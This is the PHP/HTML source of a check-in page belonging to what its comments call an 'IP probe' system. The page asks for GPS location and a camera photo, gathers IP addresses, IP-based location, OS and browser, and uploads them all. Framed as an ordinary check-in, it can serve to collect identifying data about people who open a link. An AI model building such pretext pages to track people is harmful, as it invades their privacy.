<?php
/**
 * IP 探针系统 — 签到页面
 *
 * 用户点击签到链接后：
 * 1. 请求 GPS 真实地理位置
 * 2. 要求拍照
 * 3. 采集设备/网络信息
 * 4. 上传照片 + 签到数据 → 显示签到成功
 */
require_once __DIR__ . '/config.php';
 require_once __DIR__ . '/includes/storage.php';
 require_once __DIR__ . '/includes/database.php';
 require_once __DIR__ . '/includes/checkins.php';

 $id = $_GET['id'] ?? '';
 if (empty($id)) {
     http_response_code(404);
     exit('签到链接无效');
 }

 $checkin = get_checkin_link($id);
 if (!$checkin) {
     http_response_code(404);
     exit('签到链接不存在或已被使用');
 }
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="referrer" content="no-referrer">
    <title>签到</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: #F2F2F7;
            background-image: radial-gradient(circle, #e4e7ed 1px, transparent 1px);
            background-size: 24px 24px;
            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "SF Pro Display", sans-serif;
            color: #1C1C1E;
            -webkit-font-smoothing: antialiased;
        }
        .container {
            max-width: 480px;
            margin: 0 auto;
            padding: 16px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .card {
            background: rgba(255,255,255,0.85);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border-radius: 16px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            border: 1px solid rgba(0,0,0,0.06);
            overflow: hidden;
        }
        .flex-grow { flex: 1; }

        /* Step indicators */
        .steps {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 16px 16px 0;
        }
        .step-dot {
            width: 8px; height: 8px;
            border-radius: 50%;
            background: #D1D1D6;
            transition: all 0.3s;
        }
        .step-dot.active { background: #007AFF; width: 24px; border-radius: 4px; }
        .step-dot.done { background: #34C759; }

        /* Common section */
        .section { display: none; }
        .section.active { display: block; }
        .section-body { padding: 24px; }

        /* Location section */
        .loc-icon {
            width: 64px; height: 64px;
            background: linear-gradient(135deg, #007AFF, #5856D6);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 16px;
            box-shadow: 0 4px 16px rgba(0,122,255,0.3);
        }
        .loc-icon svg { width: 32px; height: 32px; stroke: #fff; fill: none; }
        .section-title {
            font-size: 20px; font-weight: 700; text-align: center;
            margin-bottom: 6px;
        }
        .section-desc {
            font-size: 14px; color: #8E8E93; text-align: center;
            margin-bottom: 20px; line-height: 1.5;
        }
        .gps-info {
            background: var(--color-surface-input, #FAFAFA);
            border-radius: 10px; padding: 12px 16px;
            font-size: 13px; color: #8E8E93; text-align: center;
            margin-bottom: 16px; line-height: 1.6;
        }
        .gps-info strong { color: #1C1C1E; font-weight: 600; }
        .btn-primary {
            display: block; width: 100%;
            padding: 14px; border: none; border-radius: 12px;
            background: #007AFF; color: #fff;
            font-size: 16px; font-weight: 600;
            cursor: pointer; transition: all 0.15s;
        }
        .btn-primary:active { transform: scale(0.98); background: #0066D6; }
        .btn-primary:disabled { background: #C7C7CC; cursor: not-allowed; }
        .btn-secondary {
            display: block; width: 100%;
            padding: 12px; border: 1px solid #D1D1D6; border-radius: 12px;
            background: #fff; color: #007AFF;
            font-size: 15px; font-weight: 500;
            cursor: pointer; margin-top: 10px;
        }
        .error-text {
            color: #FF3B30; font-size: 13px; text-align: center;
            margin-top: 8px;
        }

        /* Camera section */
        .camera-wrapper {
            position: relative; width: 100%;
            border-radius: 12px; overflow: hidden;
            background: #1C1C1E; margin-bottom: 0;
            aspect-ratio: 4/3;
        }
        .camera-wrapper video,
        .camera-wrapper canvas {
            width: 100%; height: 100%;
            object-fit: cover; display: block;
        }
        .camera-wrapper video { transform: scaleX(-1); }
        .camera-wrapper canvas { display: none; }
        .camera-wrapper.photo-taken video { display: none; }
        .camera-wrapper.photo-taken canvas { display: block; }
        .camera-controls {
            background: rgba(255,255,255,0.92);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 12px;
            border: 1px solid rgba(0,0,0,0.08);
            padding: 20px;
            margin-top: 12px;
            text-align: center;
        }
        .shutter-btn {
            width: 76px; height: 76px;
            border-radius: 50%;
            border: 4px solid #007AFF;
            background: rgba(0,122,255,0.1);
            cursor: pointer; margin: 0 auto 8px;
            display: flex; align-items: center; justify-content: center;
            transition: all 0.15s; position: relative;
        }
        .shutter-btn::after {
            content: ''; width: 56px; height: 56px;
            border-radius: 50%; background: #007AFF;
            transition: all 0.15s;
        }
        .shutter-btn:active::after { transform: scale(0.85); }
        .shutter-btn:disabled { opacity: 0.3; cursor: not-allowed; }
        .shutter-hint {
            font-size: 13px; color: #8E8E93; margin-bottom: 4px;
        }
        .retake-area-inner {
            display: flex; gap: 12px; justify-content: center;
        }
        .retake-btn {
            flex: 1; max-width: 160px;
            padding: 14px 20px;
            border: 1.5px solid #C7C7CC;
            border-radius: 12px; background: #fff;
            color: #1C1C1E; font-size: 15px; font-weight: 600;
            cursor: pointer;
            transition: all 0.15s;
        }
        .retake-btn:active { background: #F2F2F7; transform: scale(0.97); }
        .confirm-area-inner {
            flex: 1; max-width: 160px;
        }
        .confirm-area-inner .btn-primary {
            padding: 14px 20px; font-size: 15px;
        }

        /* Uploading / Success section */
        .spinner {
            width: 40px; height: 40px;
            border: 3px solid #e5e5ea; border-top-color: #007AFF;
            border-radius: 50%; animation: spin 0.6s linear infinite;
            margin: 0 auto 16px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .success-icon {
            width: 64px; height: 64px;
            background: linear-gradient(135deg, #34C759, #30D158);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 16px;
            box-shadow: 0 4px 16px rgba(52,199,89,0.3);
        }
        .success-icon svg { width: 32px; height: 32px; stroke: #fff; fill: none; }
        .ip-highlight {
            font-size: 20px; font-weight: 700; color: #007AFF;
            font-family: "SF Mono","Fira Code",monospace;
            text-align: center; padding: 4px 0 12px;
        }
        .info-group {
            background: rgba(255,255,255,0.6);
            border-radius: 12px; border: 1px solid rgba(0,0,0,0.04);
            margin-bottom: 10px; overflow: hidden;
        }
        .info-group-title {
            font-size: 12px; font-weight: 600; color: #8E8E93;
            text-transform: uppercase; letter-spacing: 0.5px;
            padding: 10px 16px 4px;
        }
        .info-row {
            display: flex; justify-content: space-between; align-items: center;
            padding: 8px 16px;
            border-bottom: 1px solid rgba(0,0,0,0.04);
        }
        .info-row:last-child { border-bottom: none; }
        .info-label { font-size: 14px; color: #8E8E93; }
        .info-value {
            font-size: 14px; color: #1C1C1E; font-weight: 500;
            text-align: right; max-width: 65%; word-break: break-all;
        }
        .info-value.mono { font-family: "SF Mono","Fira Code",monospace; font-size: 13px; }
        .photo-preview {
            width: 100%; border-radius: 10px;
            margin-top: 8px; margin-bottom: 12px;
        }
        .footer {
            text-align: center; padding: 12px 0;
            font-size: 12px; color: #C7C7CC;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Step indicators -->
        <div class="steps">
            <div class="step-dot active" id="dot-step1"></div>
            <div class="step-dot" id="dot-step2"></div>
            <div class="step-dot" id="dot-step3"></div>
        </div>

        <div class="flex-grow">
            <!-- Step 1: GPS Location -->
            <div class="section active" id="section-location">
                <div class="card" style="margin-top:16px;">
                    <div class="section-body">
                        <div class="loc-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
                        </div>
                        <div class="section-title">获取位置信息</div>
                        <div class="section-desc">签到需要获取您的真实地理位置<br>请点击下方按钮授权定位</div>
                        <div class="gps-info" id="gps-status">等待获取位置...</div>
                        <div id="gps-coords" style="display:none;"></div>
                        <button class="btn-primary" id="btn-get-location">
                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;margin-right:6px;"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/><line x1="12" y1="2" x2="12" y2="6"/><line x1="12" y1="18" x2="12" y2="22"/><line x1="2" y1="12" x2="6" y2="12"/><line x1="18" y1="12" x2="22" y2="12"/></svg>
                            获取位置
                        </button>
                        <div class="error-text" id="gps-error" style="display:none;"></div>
                        <button class="btn-secondary" id="btn-skip-location" style="display:none;">跳过定位（仅使用 IP 位置）</button>
                    </div>
                </div>
            </div>

            <!-- Step 2: Camera -->
            <div class="section" id="section-camera">
                <div class="card" style="margin-top:16px;">
                    <div class="section-body">
                        <div class="section-title">拍照签到</div>
                        <div class="section-desc">请拍摄一张照片作为签到凭证</div>
                        <div class="camera-wrapper" id="camera-wrapper">
                            <video id="camera-video" autoplay playsinline muted></video>
                            <canvas id="camera-canvas"></canvas>
                        </div>
                        <div class="camera-controls">
                            <div id="shutter-area">
                                <div class="shutter-btn" id="btn-shutter"></div>
                                <div class="shutter-hint">点击拍摄</div>
                            </div>
                            <div id="retake-area" style="display:none;">
                                <div class="retake-area-inner">
                                    <button class="retake-btn" id="btn-retake">重拍</button>
                                    <div class="confirm-area-inner">
                                        <button class="btn-primary" id="btn-confirm-photo">确认签到</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="error-text" id="camera-error" style="display:none;"></div>
                    </div>
                </div>
            </div>

            <!-- Step 3: Uploading -->
            <div class="section" id="section-uploading">
                <div class="card" style="margin-top:16px;">
                    <div class="section-body" style="padding:48px 24px;text-align:center;">
                        <div class="spinner"></div>
                        <div class="section-title">正在提交签到...</div>
                        <div class="section-desc">请稍候</div>
                    </div>
                </div>
            </div>

            <!-- Step 4: Success -->
            <div class="section" id="section-success">
                <div class="card" style="margin-top:16px;">
                    <div class="section-body">
                        <div class="success-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                        </div>
                        <div class="section-title">签到成功</div>
                        <div class="section-desc" id="success-time"></div>
                        <div class="ip-highlight" id="success-ip"></div>

                        <!-- 签到照片 -->
                        <div id="success-photo-wrap" style="text-align:center;margin-bottom:12px;">
                            <img id="success-photo" class="photo-preview" style="max-width:280px;" alt="签到照片">
                        </div>

                        <div class="info-group">
                            <div class="info-group-title">GPS 位置</div>
                            <div class="info-row">
                                <span class="info-label">坐标</span>
                                <span class="info-value mono" id="info-gps-coord">--</span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">精度</span>
                                <span class="info-value" id="info-gps-accuracy">--</span>
                            </div>
                        </div>
                        <div class="info-group">
                            <div class="info-group-title">网络信息</div>
                            <div class="info-row">
                                <span class="info-label">IPv4</span>
                                <span class="info-value mono" id="info-ipv4">--</span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">IPv6</span>
                                <span class="info-value mono" id="info-ipv6">--</span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">位置 (IP)</span>
                                <span class="info-value" id="info-location">--</span>
                            </div>
                        </div>
                        <div class="info-group">
                            <div class="info-group-title">设备信息</div>
                            <div class="info-row">
                                <span class="info-label">系统</span>
                                <span class="info-value" id="info-os">--</span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">浏览器</span>
                                <span class="info-value" id="info-browser">--</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Error (fatal) -->
            <div class="section" id="section-error">
                <div class="card" style="margin-top:16px;">
                    <div class="section-body" style="padding:48px 24px;text-align:center;">
                        <div style="width:56px;height:56px;background:rgba(255,59,48,0.1);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">
                            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#FF3B30" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
                        </div>
                        <div class="section-title">签到失败</div>
                        <div class="section-desc" id="error-msg">请稍后重试</div>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">IP Probe · Check-in</div>
    </div>

    <script>window.CHECKIN_ID = '<?php echo htmlspecialchars($id, ENT_QUOTES, 'UTF-8'); ?>';</script>
    <script>window.SITE_URL = '<?php
        $proto = (!empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] !== "off") ? "https" : "http";
        $host  = $_SERVER["HTTP_HOST"] ?? "localhost";
        $basePath = rtrim(dirname($_SERVER["SCRIPT_NAME"]), "/\\");
        echo $proto . "://" . $host . $basePath;
    ?>';</script>
    <script src="assets/checkin.js"></script>
</body>
</html>
